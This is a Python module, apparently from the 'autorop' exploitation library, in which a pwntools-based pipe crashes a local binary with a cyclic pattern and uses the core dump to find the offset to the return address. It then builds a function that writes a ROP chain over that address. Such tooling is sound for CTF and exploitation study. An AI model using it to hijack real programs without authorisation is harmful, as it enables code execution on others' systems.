from autorop import PwnState, Pipe, constants
from pwn import tube, process, cyclic, cyclic_find, log, pack


class Corefile(Pipe):
    def __init__(self) -> None:
        """Find offset to the return address via buffer overflow using corefile.

        This pipe not only finds the offset from the input to the return address
        on the stack, but also sets ``state.overwriter`` to be a function that correctly
        overwrites starting at the return address.

        You can avoid active corefile generation by setting ``state.bof_ret_offset``
        yourself - in this case, the ``state.overwriter`` is set appropriately.
        """
        super().__init__(())

    def __call__(self, state: PwnState) -> PwnState:
        """Transform the given ``PwnState`` to have a buffer overflow ``overwriter``.

        Arguments:
            state: The current ``PwnState`` with the following set

                - ``binary_name``: Path to binary.
                - ``bof_ret_offset``: (optional) If not ``None``,
                  skips corefile generation step.
                - ``overwriter``: Function which writes rop chain to the "right place".

        Returns:
            Mutated ``PwnState``, with the following updated

                - ``bof_ret_offset``: Updated if it was not set before.
                - ``overwriter``: Now calls the previous ``overwriter`` but with
                  ``bof_ret_offset`` padding bytes prepended to the data given,
                  and reading the same number of lines as were observed
                  at the crash.
        """
        #: Number of bytes to send to attempt to trigger a segfault
        #: for corefile generation.
        CYCLIC_SIZE = 1024

        output_lines_after_input = 0

        if state.bof_ret_offset is None:
            # cause crash and find offset via corefile
            p: tube = process(state.binary_name)
            p.clean(constants.CLEAN_TIME)
            state.overwriter(p, cyclic(CYCLIC_SIZE))
            p.wait()
            output_lines_after_input = p.recvall().count(b"\n")
            fault: int = p.corefile.fault_addr
            log.info("Fault address @ " + hex(fault))
            state.bof_ret_offset = cyclic_find(pack(fault))
        log.info("Offset to return address is " + str(state.bof_ret_offset))

        if state.bof_ret_offset < 0:
            log.error(f"Invalid offset to return addess ({state.bof_ret_offset})!")

        old_overwriter = state.overwriter

        # define overwriter as expected - to write data starting at return address
        # it will also automatically handle reading output which was printed
        # so as not to require manual intervention for silencing generic output
        def overwriter(t: tube, data: bytes) -> None:
            old_overwriter(t, cyclic(state.bof_ret_offset) + data)
            for _ in range(output_lines_after_input):
                t.recvline()

        state.overwriter = overwriter

        return state
